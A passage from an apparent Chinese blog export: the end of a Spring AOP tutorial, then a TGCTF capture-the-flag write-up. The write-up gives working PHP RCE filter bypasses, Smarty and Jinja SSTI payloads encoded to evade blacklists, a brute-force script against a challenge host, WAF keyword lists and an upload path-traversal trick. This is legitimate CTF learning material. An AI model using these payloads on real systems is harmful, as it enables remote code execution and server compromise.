System.out.println(&quot;Logger--&gt;前置通知，方法名：&quot;+methodName+&quot;，参数：&quot;+args);&#125;\n\n\n\n\n\n6.获取通知的相关信息获取连接点信息\n1.JoinPoint\n适用于：\n\n@Before\n@After\n@AfterReturning\n@AfterThrowing\n\n@Before(&quot;serviceMethods()&quot;)public void before(JoinPoint joinPoint) &#123;    MethodSignature signature = (MethodSignature) joinPoint.getSignature();    Method method = signature.getMethod();    System.out.println(&quot;方法名：&quot; + method.getName());    System.out.println(&quot;参数：&quot; + Arrays.toString(joinPoint.getArgs()));&#125;\n\n\n\n2.ProceedingJoinPoint（@Around 专属）\n这是 最强的，因为你能：\n\n获取方法\n获取参数\n控制是否调用目标方法\n替换返回值\n\n@Around(&quot;serviceMethods()&quot;)public Object around(ProceedingJoinPoint pjp) throws Throwable &#123;    MethodSignature signature = (MethodSignature) pjp.getSignature();    Method method = signature.getMethod();    System.out.println(&quot;增强方法：&quot; + method.getName());    Object result = pjp.proceed(); // 执行目标方法    return result;&#125;\n\n⚠️ 不调用 proceed()，目标方法不会执行\n获取目标方法的返回值\n@AfterReturning中的属性returning，用来将通知方法的某个形参，接收目标方法的返回值\n@AfterReturning(value = &quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, returning = &quot;result&quot;)public void afterReturningMethod(JoinPoint joinPoint, Object result)&#123;    String methodName = joinPoint.getSignature().getName();    System.out.println(&quot;Logger--&gt;返回通知，方法名：&quot;+methodName+&quot;，结果：&quot;+result);&#125;\n\n\n\n获取目标方法的异常\n@AfterThrowing中的属性throwing，用来将通知方法的某个形参，接收目标方法的异常\n@AfterThrowing(value = &quot;execution(* com.atguigu.aop.annotation.CalculatorImpl.*(..))&quot;, throwing = &quot;ex&quot;)public void afterThrowingMethod(JoinPoint joinPoint, Throwable ex)&#123;    String methodName = joinPoint.getSignature().getName();    System.out.println(&quot;Logger--&gt;异常通知，方法名：&quot;+methodName+&quot;，异常：&quot;+ex);&#125;\n\n\n\n\n\n\n\n7.切面优先级核心结论三条：\n\n切面之间的顺序 → 用 @Order 或 Ordered 控制\n数字越小，优先级越高\n@Around 的执行顺序 ≠ @Before/@After 的执行顺序\n\n设置切面优先级\n1️⃣ 使用 @Order（最常用）\n@Aspect@Component@Order(1)   // 优先级最高public class LogAspect &#123; &#125;@Aspect@Component@Order(2)public class TxAspect &#123; &#125;\n\n\n\n2️⃣ 使用 Ordered 接口（本质一样）\npublic class AuthAspect implements Ordered &#123;//切面类继承Ordered然后就可以设置优先级了    @Override    public int getOrder() &#123;        return 1;    &#125;&#125;\n\n\n\n增强优先级执行顺序\n1️⃣ @Around 的执行顺序（最容易搞错）\n@Order(1)  Around before    @Order(2)  Around before        目标方法    @Order(2)  Around after@Order(1)  Around after\n\n属于洋葱模型\n2️⃣ @Before 的执行顺序\n@Order(1) @Before@Order(2) @Before目标方法\n\n数值小的先执行\n3️⃣ @After / @AfterReturning / @AfterThrowing 的执行顺序\n目标方法@Order(2) @After@Order(1) @After\n\n数值大的先执行（和 Before 相反）\n完整调用链\n@Order(1) Around (before)    @Order(2) Around (before)        @Order(1) Before        @Order(2) Before            目标方法        @Order(2) After        @Order(1) After    @Order(2) Around (after)@Order(1) Around (after)\n\n\n\n\n\n4.基于XML的AOP就是不用注解。而是使用xml进行注册为AOP。使用xml的好处就是只需要在代码开始执行的时候扫描xml问价，不需要特地的去扫描包\n&lt;context:component-scan base-package=&quot;com.atguigu.aop.xml&quot;&gt;&lt;/context:component-scan&gt;&lt;aop:config&gt;    &lt;!--配置切面类--&gt;    &lt;aop:aspect ref=&quot;loggerAspect&quot;&gt;        &lt;aop:pointcut id=&quot;pointCut&quot;                    expression=&quot;execution(* com.atguigu.aop.xml.CalculatorImpl.*(..))&quot;/&gt;        &lt;aop:before method=&quot;beforeMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:before&gt;        &lt;aop:after method=&quot;afterMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:after&gt;        &lt;aop:after-returning method=&quot;afterReturningMethod&quot; returning=&quot;result&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:after-returning&gt;        &lt;aop:after-throwing method=&quot;afterThrowingMethod&quot; throwing=&quot;ex&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:after-throwing&gt;        &lt;aop:around method=&quot;aroundMethod&quot; pointcut-ref=&quot;pointCut&quot;&gt;&lt;/aop:around&gt;    &lt;/aop:aspect&gt;&lt;/aop:config&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Spring","IoC容器","依赖注入"]},{"title":"TGCTF","url":"/2025/04/13/TGCTF/","content":"TGCTF题解1.AAA偷渡阴平源代码\n&lt;?php    $tgctf2025=$_GET[&#x27;tgctf2025&#x27;];if(!preg_match(&quot;/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $tgctf2025))&#123;    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);&#125;else&#123;    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);&#125;highlight_file(__FILE__); \n\n过滤掉了除2以外的数字，还过滤掉了斜杠和引号和反引号，我们没办法表示路径和cat等命令获取flag\n但是注意到过滤的括号为中文括号，我们可以使用无参rce，通过利用各种函数去构造路径去访问flag\npaylaod:\n1.使用getallheaders()通过请求头中自定义xff 去传递命令\n\n\n我们使用next()函数去获取到我们xff(我发现一个很奇怪的地方，这足以说明我这个解不是预期解，但是又有点牛逼，可以通过请求头自定义参数)\n我们先传入\nvar_dump(getallheaders());\n\n\n\n返回的是一个数组，本来这么多值可以用，随便写，但是就在于我不能随便确定它的排序顺序，一开始我是用xxf写出来的但现在怎么都不行\n不同服务器环境下 getallheaders() 返回的数组顺序不同：\n\nApache 环境：通常按照客户端发送的原始顺序返回\nNginx + PHP-FPM：通常按字母顺序排序（不区分大小写）\n其他服务器：可能有不同的排序方式\n\n但是这次是nginx，是根据字母排序的，事实也是如此，我们直接利用content-type\nsystem(next(getallheaders()));content-type=cat /flag\n\n\n\n\n\n好了，我的方法结束了，到预期解了。这题的预期解是用无参RCE，虽然我也是，但还是不好用\npayload\n/?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;cat /flag&#x27;);\n\n我们先来看下get_defined_vars()返回什么\n?tgctf2025=var_dump(get_defined_vars());&amp;b=system(&#x27;cat /flag&#x27;);\n\n\n\n可以看到，我们的参数被放在第一个_GET数组里面，我们先选中_GET再用next输出命令执行代码，然后再用eval执行也可以\n?tgctf2025=eval(next(current(get_defined_vars())));&amp;b=system(&#x27;cat /flag&#x27;);\n\n2.火眼辩魑魅我们先访问robots.txt拿到题目\nUser-Agent: *Disallow: tgupload.phpDisallow: tgshell.phpDisallow: tgxff.phpDisallow: tgser.phpDisallow: tgphp.phpDisallow: tginclude.php\n\n我们先挨个看题目\n1.tgupload.php文件上传，但是无论什么文件都不能上传\n\n\n\n2.tgshell.php&lt;?php    $shell=$_POST[&quot;shell&quot;];    &#123;        eval($shell);    &#125;?&gt;\n\n试了一下，发现实际上是存在过滤的题目，我们尝试使用highlight_file()去拿tgshell.php源码，直接拿到\nshell=highlight_file(&#x27;tgshell.php&#x27;);\n\n源码\n(&gt;ω&lt;)(◕‿◕✿)&lt;?php    $shell=$_POST[&quot;shell&quot;];    &#123;        eval($shell);    &#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;TGCTF-青春CTFer&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt;    &lt;div class=&quot;decoration&quot;&gt;(&gt;ω&lt;)&lt;/div&gt;    &lt;div class=&quot;decoration&quot;&gt;(◕‿◕✿)&lt;/div&gt;    &lt;div class=&quot;message-box&quot;&gt;        &lt;div class=&quot;blush left&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;blush right&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;code-box&quot;&gt;&lt;pre&gt;&lt;code&gt;&lt;?php                    $source_code = &lt;&lt;&lt;&#x27;CODE&#x27;&lt;?php    $shell=$_POST[&quot;shell&quot;];    &#123;        eval($shell);    &#125;?&gt;CODE;echo htmlspecialchars($source_code);?&gt;&lt;/code&gt;&lt;/pre&gt;        &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif ($_POST[&quot;shell&quot;])&#123;    $shell=$_POST[&quot;shell&quot;];    if(!preg_match(&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;, $shell))    &#123;        eval($shell);    &#125;    else&#123;        die(&quot;你明明知道你被waf了，为什么还在尝试？。？&quot;);    &#125;&#125;else&#123;    echo &quot;哇，贞德是你鸭！&quot;;&#125;?&gt;\n\n发现没有过滤反引号，直接命令执行，但是反引号不能直接输出，前面需要添加echo\npayload1:\n echo `ls /`;//bin dev etc home lib media mnt opt proc root run run.sh sbin srv sys tgfffffllllaagggggg tmp usr var echo `cat /tgfffffllllaagggggg`;\n\n\n\n我们除了反引号还可以使用其他未被过滤的命令执行函数\ncreate_function() 因安全问题（内部使用 eval()）被标记为弃用，并在 PHP 8.0.0 中完全移除。现在应该使用匿名函数替代。我们查看phpinfo()发现为7.3.4\npayload2:\n//我们使用creat_function()shell=echo create_function(&#x27;&#x27;,$_POST[&#x27;cmd&#x27;])();&amp;cmd=system(&#x27;cat /tgfffffllllaagggggg&#x27;);\n\n3.tgxff.php虽然题目说只有一个洞，但实际上还是有机会的\n看见到获取了我的ip直接尝试xff发现可以直接命令执行，直接拿flag\nX-Forwarded-For:&#123;&#123;system(&#x27;cat /tgfffffllllaagggggg&#x27;)&#125;&#125;\n\n//tgxff.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;TGCTF-青春CTFer&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;container&quot;&gt;    &lt;div class=&quot;decoration&quot;&gt;(&gt;ω&lt;)&lt;/div&gt;    &lt;div class=&quot;decoration&quot;&gt;(◕‿◕✿)&lt;/div&gt;    &lt;div class=&quot;message-box&quot;&gt;        &lt;div class=&quot;blush left&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;blush right&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;code-box&quot;&gt;            &lt;form class=&quot;input-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;                &lt;?php                error_reporting(0);                require &#x27;./Smarty/libs/Smarty.class.php&#x27;;                $smarty = new Smarty();                $ip = isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]) ? $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] : $_SERVER[&#x27;REMOTE_ADDR&#x27;];                echo &quot;OvO 你电脑的IP是：&quot;;                $smarty-&gt;display(&quot;string:&quot;.$ip);//这里直接对我们的ip于模板进行拼接，我们可以进行模板注入，                ?&gt;            &lt;/form&gt;        &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n\nSmarty 的 &#123;&#123;...&#125;&#125; 是模板语法\n\n类似于 PHP 的 &lt;?php ... ?&gt;，Smarty 会解析并执行其中的代码。\n&#123;&#123;system('ls')&#125;&#125; 等价于 &lt;?php system(&#39;ls&#39;); ?&gt;。\n\n4.tgser.phpphp反序列化题目，我没办法解\nif (md5($this-&gt;fish) == $this-&gt;fish) &#123;            return $this-&gt;shark-&gt;upper;        &#125;\n\n使用phpinfo()查看php版本为7.3.4，无法自动识别科学计数法\n即使让字符串被编码后两边都是字符串，不能进行类型转化也无法科学计数法绕过\n5.tginclude.php&lt;?php    error_reporting(0);    $code = $_GET[&#x27;code&#x27;] ?? &#x27;&#x27;;    $white_list = [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;$&#x27;, &#x27;\\\\&#x27;, &#x27;;&#x27;];    for ($i = 0; $i &lt; strlen($code); $i++) &#123;        $char = $code[$i];        if (!in_array($char, $white_list)) &#123;            die(&quot;检测到非法字符: &quot; . htmlspecialchars($char) . &quot;！只允许使用数字0-9和小部分符号哦！&quot;);        &#125;    &#125;    eval($code);?&gt;\n\n根本没办法，只用数字肯定不行\n6.tginclude.php知道了路径后直接包含flag路径就行了，但是都知道路径了怎么会看到这\n/tgfffffllllaagggggg\n\n\n\n3.直面天命（复仇）这题界面上有个输入框，会回显。首先猜测是SSTI注入，但是大括号被过滤掉了，直接把SSTI给打死了\n提示hint&#x2F;说还存在一个路由，由四个小写字母组成，但是用dirsearch扫不出来，只能尝试使用爆破去爆，最后爆了一万多次没拿到，只能买提示路由为&#x2F;aazz，我们访问拿到源代码(实际上复仇版是直接在hint告诉我们的，但是原版应该是用爆破，如果按顺序去爆其实没多少次)\nimport osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=[&#x27;lipsum&#x27;,&#x27;|&#x27;,&#x27;%&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;map&#x27;,&#x27;chr&#x27;, &#x27;value&#x27;, &#x27;get&#x27;, &quot;url&quot;, &#x27;pop&#x27;,&#x27;include&#x27;,&#x27;popen&#x27;,&#x27;os&#x27;,&#x27;import&#x27;,&#x27;eval&#x27;,&#x27;_&#x27;,&#x27;system&#x27;,&#x27;read&#x27;,&#x27;base&#x27;,&#x27;globals&#x27;,&#x27;_.&#x27;,&#x27;set&#x27;,&#x27;application&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;, &#x27;+&#x27;, &#x27;init&#x27;, &#x27;arg&#x27;, &#x27;config&#x27;, &#x27;app&#x27;, &#x27;self&#x27;]def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in typable_chars@app.route(&#x27;/&#x27;)def home():    return send_from_directory(&#x27;static&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/jingu&#x27;, methods=[&#x27;POST&#x27;])def greet():    template1=&quot;&quot;    template2=&quot;&quot;    name = request.form.get(&#x27;name&#x27;)    template = f&#x27;&#123;name&#125;&#x27;    if waf(name):        template = &#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹Image&#x27;    else:        k=0        for i in name:            if is_typable(i):                continue            k=1            break        if k==1:            if not (secret_key[:2] in name and secret_key[2:]):                template = &#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧再去西行历练历练Image&#x27;                return render_template_string(template)            template1 = &quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”最后，如果你用了cat，就可以见到齐天大圣了&quot;            template= template.replace(&quot;天命&quot;,&quot;&#123;&#123;&quot;).replace(&quot;难违&quot;,&quot;&#125;&#125;&quot;)            template = template    if &quot;cat&quot; in template:        template2 = &#x27;或许你这只叫天命人的猴子，真的能做到？Image&#x27;    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message = f&quot;500报错了，查询语句如下：&#123;template&#125;&quot;        return error_message, 400@app.route(&#x27;/hint&#x27;, methods=[&#x27;GET&#x27;])def hinter():    template=&quot;hint：有一个aazz路由，去那里看看吧，天命人!&quot;    return render_template_string(template)@app.route(&#x27;/aazz&#x27;, methods=[&#x27;GET&#x27;])def finder():    with open(__file__, &#x27;r&#x27;) as f:        source_code = f.read()    return f&quot;&#123;source_code&#125;&quot;, 200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=utf-8&#x27;&#125;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=80)\n\n有个很抽象的脑洞就是，在原版里面没有源代码，我们需要自己去猜。在页面源代码里面有提示说本页可以传参，我们需要去猜测，实际上传参的名字为filename，我们输入?filename&#x3D;&#x2F;flag，原版就能直接拿到flag了，访问app.py就能拿到下面的源码了\nimport osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=[&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;popen&#x27;,&#x27;os&#x27;,&#x27;import&#x27;,&#x27;eval&#x27;,&#x27;_&#x27;,&#x27;system&#x27;,&#x27;read&#x27;,&#x27;base&#x27;,&#x27;globals&#x27;]def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in typable_chars@app.route(&#x27;/&#x27;)def home():    return send_from_directory(&#x27;static&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/jingu&#x27;, methods=[&#x27;POST&#x27;])def greet():    template1=&quot;&quot;    template2=&quot;&quot;    name = request.form.get(&#x27;name&#x27;)    template = f&#x27;&#123;name&#125;&#x27;    if waf(name):        template = &#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;3.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;    else:        k=0        for i in name:            if is_typable(i):                continue            k=1            break        if k==1:            if not (secret_key[:2] in name and secret_key[2:]):                template = &#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&lt;br&gt;&lt;br&gt;再去西行历练历练&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;4.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;                return render_template_string(template)            template1 = &quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”&lt;br&gt;最后，如果你用了cat，就可以见到齐天大圣了&lt;br&gt;&quot;            template= template.replace(&quot;直面&quot;,&quot;&#123;&#123;&quot;).replace(&quot;天命&quot;,&quot;&#125;&#125;&quot;)            template = template    if &quot;cat&quot; in template:        template2 = &#x27;&lt;br&gt;或许你这只叫天命人的猴子，真的能做到？&lt;br&gt;&lt;br&gt;&lt;img src=&quot;&#123;&#123;  url_for(&quot;static&quot;, filename=&quot;2.jpeg&quot;) &#125;&#125;&quot; alt=&quot;Image&quot;&gt;&#x27;    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message = f&quot;500报错了，查询语句如下：&lt;br&gt;&#123;template&#125;&quot;        return error_message, 400@app.route(&#x27;/hint&#x27;, methods=[&#x27;GET&#x27;])def hinter():    template=&quot;hint：&lt;br&gt;有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!&quot;    return render_template_string(template)@app.route(&#x27;/aazz&#x27;, methods=[&#x27;GET&#x27;])def finder():    filename = request.args.get(&#x27;filename&#x27;, &#x27;&#x27;)    if filename == &quot;&quot;:        return send_from_directory(&#x27;static&#x27;, &#x27;file.html&#x27;)    if not filename.replace(&#x27;_&#x27;, &#x27;&#x27;).isalnum():        content = jsonify(&#123;&#x27;error&#x27;: &#x27;只允许字母和数字！&#x27;&#125;), 400    if os.path.isfile(filename):        try:            with open(filename, &#x27;r&#x27;) as file:                content = file.read()            return content        except Exception as e:            return jsonify(&#123;&#x27;error&#x27;: str(e)&#125;), 500    else:        return jsonify(&#123;&#x27;error&#x27;: &#x27;路径不存在或者路径非法&#x27;&#125;), 404if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;, port=80)\n\n这个secret_key根本不是python自带的库，那么a.b.c.d.secter就有问题，我们尝试访问?filename&#x3D;a&#x2F;b&#x2F;c&#x2F;d&#x2F;secret.py，我们原版就能获得提示\n# 找到六根又如何？还不是听天由命？直面天命吧，天命人！secret_key = &quot;直面天命&quot;\n\n这也对应了app.py里面把直面和天命分别替换为&#123;&#123;和&#125;&#125;，有了大括号后我们就可以直接开始SSTI注入了(他用汉字替换大括号是为了防止我们用工具吗，看来只能自己写payload了)\npayload\nblack_list=[&#x27;lipsum&#x27;,&#x27;|&#x27;,&#x27;%&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;map&#x27;,&#x27;chr&#x27;, &#x27;value&#x27;, &#x27;get&#x27;, &quot;url&quot;, &#x27;pop&#x27;,&#x27;include&#x27;,&#x27;popen&#x27;,&#x27;os&#x27;,&#x27;import&#x27;,&#x27;eval&#x27;,&#x27;_&#x27;,&#x27;system&#x27;,&#x27;read&#x27;,&#x27;base&#x27;,&#x27;globals&#x27;,&#x27;_.&#x27;,&#x27;set&#x27;,&#x27;application&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;, &#x27;+&#x27;, &#x27;init&#x27;, &#x27;arg&#x27;, &#x27;config&#x27;, &#x27;app&#x27;, &#x27;self&#x27;]#只进行了黑名单，我们挨个绕过即可\n\n我们使用编码绕过下划线和关键字，先使用脚本跑出os模块\nimport requestsurl=&#x27;http://node2.tgctf.woooo.tech:32725/jingu&#x27;for i in range(500):    params=&#123;        &#x27;name&#x27;:&#x27;天命()[&quot;\\\\x5f\\\\x5fclass\\\\x5f\\\\x5f&quot;][&quot;\\\\x5f\\\\x5fmro\\\\x5f\\\\x5f&quot;][1][&quot;\\\\x5f\\\\x5fsubclasses\\\\x5f\\\\x5f&quot;]()[&#x27;+str(i)+&#x27;]难违&#x27;    &#125;    try:        response = requests.post(url,data=params)        if response.status_code==200:            #print(response.text)            if &#x27;os._wrap&#x27; in response.text:                print(i)    except:        pass\n\n我们跑出来132\n我们继续使用编码绕过\n天命()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[132][&#x27;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f&#x27;][&#x27;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f&#x27;][&#x27;\\u0070\\u006f\\u0070\\u0065\\u006e&#x27;](&#x27;cat /tgffff11111aaaagggggggg&#x27;)[&#x27;\\u0072\\u0065\\u0061\\u0064&#x27;]()难违#这是使用16进制和Unicode编码#翔神使用了八进制  好强天命&#x27;&#x27;[&quot;\\137\\137\\143\\154\\141\\163\\163\\137\\137&quot;][&quot;\\137\\137\\155\\162\\157\\137\\137&quot;][1][&quot;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137&quot;]()[137][&quot;\\137\\137\\151\\156\\151\\164\\137\\137&quot;][&quot;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137&quot;][&#x27;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137&#x27;][&#x27;\\145\\166\\141\\154&#x27;](&quot;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\047\\157\\163\\047\\051\\056\\160\\157\\160\\145\\156\\050\\047cat /tgffff11111aaaagggggggg\\047\\051\\056\\162\\145\\141\\144\\050\\051&quot;)难违\n\n\n\n\n\n\n\n4.(ez)upload这个题目在比赛的时候看了好久，根本没有思路。终于等到wp了\n界面是一个简单的文件上传界面，尝试发现后缀不能上传和php有关的文件，用的也是nginx，不能用.htaccess文件。然后就是一开始uploads文件夹为空，也就是上传根目录下没有任何文件，.user.ini目前用不了\n到这我就停了，但是题目给了提示说有备份文件，猜测是源码泄露，直接尝试index.php.bak和upload.php.bak，成功拿到upload.php的源代码\n&lt;?phpdefine(&#x27;UPLOAD_PATH&#x27;, __DIR__ . &#x27;/uploads/&#x27;);$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;php2&quot;, &quot;html&quot;, &quot;htm&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;);        if (isset($_GET[&#x27;name&#x27;])) &#123;            $file_name = $_GET[&#x27;name&#x27;];//如果name存在则$file_name=name        &#125; else &#123;            $file_name = basename($_FILES[&#x27;name&#x27;][&#x27;name&#x27;]);//否则就等于上传的文件名，通过basename()返回路径中的文件名部分        &#125;        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);//通过pathinfo获取到路径的文件名的后缀        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;name&#x27;][&#x27;tmp_name&#x27;];            $file_content = file_get_contents($temp_file);            if (preg_match(&#x27;/.+?&lt;/s&#x27;, $file_content)) &#123;                $msg = &#x27;文件内容包含非法字符，禁止上传！&#x27;;//对文件内容进行过滤，这个很容易绕过                $status_code = 403; // 403 表示禁止访问            &#125; else &#123;                $img_path = UPLOAD_PATH . $file_name;//写入文件，但是直接拼接路径存在目录穿越漏洞                if (move_uploaded_file($temp_file, $img_path)) &#123;                    $is_upload = true;                    $msg = &#x27;文件上传成功！&#x27;;                &#125; else &#123;                    $msg = &#x27;上传出错！&#x27;;                    $status_code = 500; // 500 表示服务器内部错误//进行正则匹配，pahtinfo()提取的后缀名中不能包含过滤字符                &#125;            &#125;        &#125; else &#123;            $msg = &#x27;禁止保存为该类型文件！&#x27;;            $status_code = 403; // 403 表示禁止访问        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;        $status_code = 404; // 404 表示资源未找到    &#125;&#125;// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    &#x27;status_code&#x27; =&gt; $status_code,    &#x27;msg&#x27; =&gt; $msg,]);\n\n我写这个题目还需要了解一下$_FILE\n//当文件上传后，$_FILES 数组会为每个上传的文件包含以下信息：$_FILES[&#x27;input_name&#x27;] = [//这个input_name为我们表单设置的name    &#x27;name&#x27; =&gt; &#x27;原文件名.jpg&#x27;,     // 上传文件的原始名称    &#x27;type&#x27; =&gt; &#x27;image/jpeg&#x27;,       // 文件的 MIME 类型    &#x27;tmp_name&#x27; =&gt; &#x27;/tmp/phpXxYzz&#x27;, // 服务器上的临时文件名    &#x27;error&#x27; =&gt; 0,                 // 错误代码（0表示没有错误）    &#x27;size&#x27; =&gt; 10240               // 文件大小（字节）];//文件上传表单示例&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;userfile&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;&lt;/form&gt;//检查是否有文件上传    if (isset($_FILES[&#x27;userfile&#x27;]) &amp;&amp; $_FILES[&#x27;userfile&#x27;][&#x27;error&#x27;] === UPLOAD_ERR_OK) &#123;//userfile为表单中的name属性    // 处理上传&#125;\n\n 既然给了name参数，我们肯定是要用到的，不用的话我也绕不过去\n我们来看这断代码\nelse &#123;                $img_path = UPLOAD_PATH . $file_name;//写入文件，但是直接拼接路径存在目录穿越漏洞                if (move_uploaded_file($temp_file, $img_path)) &#123;                    $is_upload = true;                    $msg = &#x27;文件上传成功！&#x27;;\n\n我们的name参数经过pathinfo()获取文件后缀进行正则匹配，我们不能直接绕过正则，看过题解有好几种方法，我这是目录穿越漏洞，我们传入\n?name=../.user.ini//会被pathinfo()拿到 .user.ini//但是直接把name拼接到var/www/html/upload.php/../.user.ini//对其进行保存时 ../就会触发，跳转的var/www/html/.user.ini进行保存\n\n文件上传中的目录穿越漏洞（Directory Traversal in File Upload）是一种常见的安全漏洞，攻击者通过构造特殊的上传文件名或路径，绕过服务器的路径限制，将文件写入非预期目录（如Web根目录之外甚至系统敏感路径）。\nPOST /upload HTTP/1.1Content-Disposition: form-data; name=&quot;file&quot;; 